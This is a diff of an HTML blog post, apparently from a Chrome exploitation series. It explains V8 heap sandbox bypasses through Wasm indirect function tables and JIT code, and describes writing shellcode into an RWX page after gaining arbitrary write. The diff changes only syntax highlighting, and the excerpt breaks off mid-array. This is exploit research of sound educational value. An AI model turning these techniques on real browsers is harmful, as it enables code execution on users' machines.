+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                           WasmTableObject table,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                           &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; entry_index,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                           &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; wasm::WasmFunction* func,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                           WasmInstanceObject target_instance)&lt;/span&gt; &lt;/span&gt;{
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;
 
-  Address call_target = target_instance.&lt;span class=&#34;hljs-built_in&#34;&gt;GetCallTarget&lt;/span&gt;(func-&amp;gt;func_index);
+  Address call_target = target_instance.GetCallTarget(func-&amp;gt;func_index);
 
-  &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; original_sig_id = func-&amp;gt;sig_index;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; original_sig_id = func-&amp;gt;sig_index;
 
-  &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, len = dispatch_tables.&lt;span class=&#34;hljs-built_in&#34;&gt;length&lt;/span&gt;(); i &amp;lt; len;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, len = dispatch_tables.length(); i &amp;lt; len;
        i += kDispatchTablenumElements) {
-    &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; table_index =
-        Smi::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(dispatch_tables.&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(i + kDispatchTableIndexOffset)).&lt;span class=&#34;hljs-built_in&#34;&gt;value&lt;/span&gt;();
-    WasmInstanceObject instance = WasmInstanceObject::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(
-        dispatch_tables.&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(i + kDispatchTableInstanceOffset));
-    &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; sig_id = target_instance.&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;()
+    &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; table_index =
+        Smi::cast(dispatch_tables.get(i + kDispatchTableIndexOffset)).value();
+    WasmInstanceObject instance = WasmInstanceObject::cast(
+        dispatch_tables.get(i + kDispatchTableInstanceOffset));
+    &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; sig_id = target_instance.&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;()
                      -&amp;gt;isorecursive_canonical_type_ids[original_sig_id];
-    WasmIndirectFunctionTable ift = WasmIndirectFunctionTable::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(
-        instance.&lt;span class=&#34;hljs-built_in&#34;&gt;indirect_function_tables&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(table_index));
-    ift.&lt;span class=&#34;hljs-built_in&#34;&gt;Set&lt;/span&gt;(entry_index, sig_id, call_target, call_ref);
+    WasmIndirectFunctionTable ift = WasmIndirectFunctionTable::cast(
+        instance.indirect_function_tables().get(table_index));
+    ift.Set(entry_index, sig_id, call_target, call_ref);
   }
 }&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Once we reach the &lt;code&gt;WasmTableObject::UpdateDispatchTables()&lt;/code&gt; function, we can finally observe the previously explained &lt;code&gt;GetCallTarget()&lt;/code&gt; and &lt;code&gt;WasmIndirectFunctionTable::Set()&lt;/code&gt; functions in action.&lt;/p&gt;
@@ -375,28 +375,28 @@ Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Once arbitrary address write is achieved, executing arbitrary code becomes possible as well.&lt;/p&gt;
 &lt;p&gt;Since the process above writes 8 bytes (corresponding to a pointer size) to an arbitrary address, you can write the desired shellcode into the RWX page 8 bytes at a time, and then call it to execute the injected shellcode.&lt;/p&gt;
 &lt;h4 id=&#34;3-1-4-Wasm-Syntax&#34;&gt;&lt;a href=&#34;#3-1-4-Wasm-Syntax&#34; class=&#34;headerlink&#34; title=&#34;3.1.4. Wasm Syntax&#34;&gt;&lt;/a&gt;3.1.4. Wasm Syntax&lt;/h4&gt;&lt;p&gt;Before exploring the bypass method using JIT, let&amp;#x2019;s take a quick look at the Wasm syntax used in the exploit!&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs wasm&#34;&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; The common type we use throughout the sample.&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;param&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)))&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs wasm&#34;&gt;(module
+  ;; The common type we use throughout the sample.
+  (type $int2int (func (param i32) (result i32)))
 
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; Import a function named jstimes3 from the environment and call it&lt;/span&gt;
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; $jstimes3 here.&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;env&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;jstimes3&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$jstimes3&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)))&lt;/span&gt;
+  ;; Import a function named jstimes3 from the environment and call it
+  ;; $jstimes3 here.
+  (import &amp;quot;env&amp;quot; &amp;quot;jstimes3&amp;quot; (func $jstimes3 (type $int2int)))
 
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;js&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tbl&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; funcref&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$f42&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$f83&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;83&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;elem&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f42&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f83&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;
+  (import &amp;quot;js&amp;quot; &amp;quot;tbl&amp;quot; (table 2 funcref))
+  (func $f42 (result i32) i32.const 42)
+  (func $f83 (result i32) i32.const 83)
+  (elem (i32.const 0) $f42 $f83)
 
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;times2&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pwn&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$jstimes3&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+  (func (export &amp;quot;times2&amp;quot;) (type $int2int) (i32.const 16))
+  (func (export &amp;quot;pwn&amp;quot;) (type $int2int) (i32.const 16) (call $jstimes3))
+)&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;First, looking at the beginning and the end, you can see that everything is enclosed within a single &lt;code&gt;(module ...)&lt;/code&gt;structure. This is used for the purpose of declaring a Module.&lt;/p&gt;
 &lt;p&gt;Next follows &lt;code&gt;(type $int2int (func (param i32) (result i32)))&lt;/code&gt;, which declares a function signature. It creates a signature named &lt;code&gt;$int2int&lt;/code&gt; that takes a 32-bit integer as an argument and returns a 32-bit integer. This is also used later as the type for the &lt;code&gt;jstimes3&lt;/code&gt; function.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;(import &amp;quot;env&amp;quot; &amp;quot;jstimes3&amp;quot; (func $jstimes3 (type $int2int)))&lt;/code&gt; is the declaration process that allows a JavaScript function, passed during instance creation, to be used inside the Wasm environment.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; importObject = {
-    &lt;span class=&#34;hljs-attr&#34;&gt;env&lt;/span&gt;: {
-        &lt;span class=&#34;hljs-attr&#34;&gt;jstimes3&lt;/span&gt;: &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;n&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * n,
+    env: {
+        jstimes3: &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;n&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * n,
     },
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;As a result, &lt;code&gt;&amp;quot;env&amp;quot; &amp;quot;jstimes3&amp;quot;&lt;/code&gt; refers to the external name specified during the passing process, meaning that it will be invoked as &lt;code&gt;$jstimes3&lt;/code&gt; when called inside the Wasm environment.&lt;/p&gt;
@@ -407,13 +407,13 @@ Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Functions &lt;code&gt;$f42&lt;/code&gt; and &lt;code&gt;$f83&lt;/code&gt; are declared to return 32-bit integers of 42 and 83 upon invocation, respectively, and are registered to the Table via &lt;code&gt;(elem (i32.const 0) $f42 $f83)&lt;/code&gt;. Here, &lt;code&gt;i32.const 0&lt;/code&gt; specifies that the starting index begins at 0.&lt;/p&gt;
 &lt;p&gt;The final two lines handle declaring the export functions that can be invoked from JavaScript; as you can see, the &lt;code&gt;pwn&lt;/code&gt;function calls the internal Wasm function &lt;code&gt;$jstimes3&lt;/code&gt;.&lt;/p&gt;
 &lt;h3 id=&#34;3-2-Using-JIT-to-Bypass-Sandbox&#34;&gt;&lt;a href=&#34;#3-2-Using-JIT-to-Bypass-Sandbox&#34; class=&#34;headerlink&#34; title=&#34;3.2. Using JIT to Bypass Sandbox&#34;&gt;&lt;/a&gt;3.2. Using JIT to Bypass Sandbox&lt;/h3&gt;&lt;h4 id=&#34;3-2-1-JIT-Fundamentals&#34;&gt;&lt;a href=&#34;#3-2-1-JIT-Fundamentals&#34; class=&#34;headerlink&#34; title=&#34;3.2.1. JIT Fundamentals&#34;&gt;&lt;/a&gt;3.2.1. JIT Fundamentals&lt;/h4&gt;&lt;p&gt;As a second method for bypassing the V8 heap sandbox, there is an approach that leverages JIT. JIT, which stands for Just-In-Time, refers to a compilation technique that translates code into machine language at the exact moment the program executes. Since a method utilizing JIT for the CVE-2023-2033 exploit has also been publicly disclosed, I have briefly summarized it in this post.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt; = (&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) =&amp;gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; foo = &lt;span class=&#34;hljs-function&#34;&gt;() =&amp;gt;&lt;/span&gt;
 {
   &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; [&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2.2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3.3&lt;/span&gt;];
 }
 
-&lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt;();
-%&lt;span class=&#34;hljs-title class_&#34;&gt;DebugPrint&lt;/span&gt;(foo);&lt;/code&gt;&lt;/pre&gt;
+foo();
+%DebugPrint(foo);&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;The code above is a simple example that declares and executes a function named &lt;code&gt;foo()&lt;/code&gt;, which returns a double array. Printing out the internal structure of the function object &lt;code&gt;foo&lt;/code&gt; yields the following output:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;DebugPrint: 0x6f1001cc631: [Function]
  - map: 0x06f1001043e5 &amp;lt;Map[28](HOLEY_ELEMenTS)&amp;gt; [FastProperties]
@@ -457,16 +457,16 @@ DebugPrint: 0x6f100267cb9: [Code] &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt
 Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;If we can manipulate the &lt;code&gt;code&lt;/code&gt; field to point to an arbitrary address when invoking a JavaScript function, it consequently means we can hijack the Program Counter (PC).&lt;/p&gt;
 &lt;h4 id=&#34;3-2-2-Exploit-with-JIT&#34;&gt;&lt;a href=&#34;#3-2-2-Exploit-with-JIT&#34; class=&#34;headerlink&#34; title=&#34;3.2.2. Exploit with JIT&#34;&gt;&lt;/a&gt;3.2.2. Exploit with JIT&lt;/h4&gt;&lt;p&gt;Unlike Wasm JIT code, which is stored outside the V8 heap region, the JIT code for standard JavaScript functions is located inside the V8 heap. To verify this behavior, I modified the previous example as follows and executed it.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt; = (&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) =&amp;gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; foo = &lt;span class=&#34;hljs-function&#34;&gt;() =&amp;gt;&lt;/span&gt;
 {
   &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; [&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2.2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3.3&lt;/span&gt;];
 }
 
-%&lt;span class=&#34;hljs-title class_&#34;&gt;PrepareFunctionForOptimization&lt;/span&gt;(foo);
-&lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt;();
-%&lt;span class=&#34;hljs-title class_&#34;&gt;OptimizeFunctionOnNextCall&lt;/span&gt;(foo);
-&lt;span class=&#34;hljs-title function_&#34;&gt;foo&lt;/span&gt;();
-%&lt;span class=&#34;hljs-title class_&#34;&gt;DebugPrint&lt;/span&gt;(foo);&lt;/code&gt;&lt;/pre&gt;
+%PrepareFunctionForOptimization(foo);
+foo();
+%OptimizeFunctionOnNextCall(foo);
+foo();
+%DebugPrint(foo);&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;To confirm the changes that occur after optimization, I explicitly triggered it using native syntax.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;DebugPrint: 0x1d04001cc681: [Function]
  - map: 0x1d04001043e5 &amp;lt;Map[28](HOLEY_ELEMenTS)&amp;gt; [FastProperties]
@@ -596,8 +596,8 @@ Instructions (size = 480)
 &lt;p&gt;&lt;img src=&#34;https://v8.dev/_img/pointer-compression/heap-layout-1.svg&#34; alt&gt;&lt;/p&gt;
 &lt;p&gt;If you apply this within a 4GB-aligned memory space, all objects share the exact same base address. This means you can easily access any internal object using just a 32-bit offset.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;                    |----- &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt; bits -----|----- &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt; bits -----|
-&lt;span class=&#34;hljs-title class_&#34;&gt;Compressed&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;pointer&lt;/span&gt;:                     |______offset_____w1|
-&lt;span class=&#34;hljs-title class_&#34;&gt;Compressed&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;Smi&lt;/span&gt;:                         |____int31_value___0|&lt;/code&gt;&lt;/pre&gt;
+Compressed pointer:                     |______offset_____w1|
+Compressed Smi:                         |____int31_value___0|&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;However, not every value in V8 memory is stored within this 4GB region. Because of this, uncompressed pointers (raw pointers) still existed to access external objects. Solving this exact issue was one of the main goals behind creating the V8 Heap Sandbox.&lt;/p&gt;
 &lt;h3 id=&#34;2-2-Mechanism-of-V8-Heap-Sandbox&#34;&gt;&lt;a href=&#34;#2-2-Mechanism-of-V8-Heap-Sandbox&#34; class=&#34;headerlink&#34; title=&#34;2.2. Mechanism of V8 Heap Sandbox&#34;&gt;&lt;/a&gt;2.2. Mechanism of V8 Heap Sandbox&lt;/h3&gt;&lt;p&gt;The V8 Heap Sandbox is a new security mitigation introduced in March 2024, starting with Chrome version 123. In this post, we will revisit the concept of the V8 Heap Sandbox&amp;#x2014;which was briefly mentioned at the end of &lt;a href=&#34;https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/&#34;&gt;&lt;em&gt;Chrome Exploit Part 4: Starting with Type Confusion 101&lt;/em&gt;&lt;/a&gt; (published before the Wipeload project)&amp;#x2014;and analyze the methods used to bypass it from a technical perspective.&lt;/p&gt;
 &lt;p&gt;In the case of the two previously mentioned vulnerabilities, if memory corruption allowed arbitrary read/write access, there were no restrictions on the accessible memory area, making successful exploitation relatively smooth. The Heap Sandbox was introduced to block this, limiting access so that even if memory corruption occurs, attackers cannot access arbitrary memory addresses.&lt;/p&gt;
@@ -633,22 +633,22 @@ Instructions (size = 480)
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Based on these patch histories, we can infer that a field storing a raw pointer existed within &lt;code&gt;WasmIndirectFunctionTable&lt;/code&gt;, a Wasm-related object. Before diving into the vulnerability itself, let&amp;#x2019;s take a quick look at what this object actually does.&lt;/p&gt;
-&lt;h4 id=&#34;3-1-2-Wasm-Fundamentals&#34;&gt;&lt;a href=&#34;#3-1-2-Wasm-Fundamentals&#34; class=&#34;headerlink&#34; title=&#34;3.1.2. Wasm Fundamentals&#34;&gt;&lt;/a&gt;3.1.2. Wasm Fundamentals&lt;/h4&gt;&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; tbl = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;WebAssembly&lt;/span&gt;.&lt;span class=&#34;hljs-title class_&#34;&gt;Table&lt;/span&gt;({
-    &lt;span class=&#34;hljs-attr&#34;&gt;initial&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,
-    &lt;span class=&#34;hljs-attr&#34;&gt;element&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;anyfunc&amp;quot;&lt;/span&gt;
+&lt;h4 id=&#34;3-1-2-Wasm-Fundamentals&#34;&gt;&lt;a href=&#34;#3-1-2-Wasm-Fundamentals&#34; class=&#34;headerlink&#34; title=&#34;3.1.2. Wasm Fundamentals&#34;&gt;&lt;/a&gt;3.1.2. Wasm Fundamentals&lt;/h4&gt;&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; tbl = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Table({
+    initial: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,
+    element: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;anyfunc&amp;quot;&lt;/span&gt;
 });
 &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; importObject = {
-    &lt;span class=&#34;hljs-attr&#34;&gt;env&lt;/span&gt;: {
-        &lt;span class=&#34;hljs-attr&#34;&gt;jstimes3&lt;/span&gt;: &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;n&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * n,
+    env: {
+        jstimes3: &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;n&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * n,
     },
-    &lt;span class=&#34;hljs-attr&#34;&gt;js&lt;/span&gt;: { tbl }
+    js: { tbl }
 };
-&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; code = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;118&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;106&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span 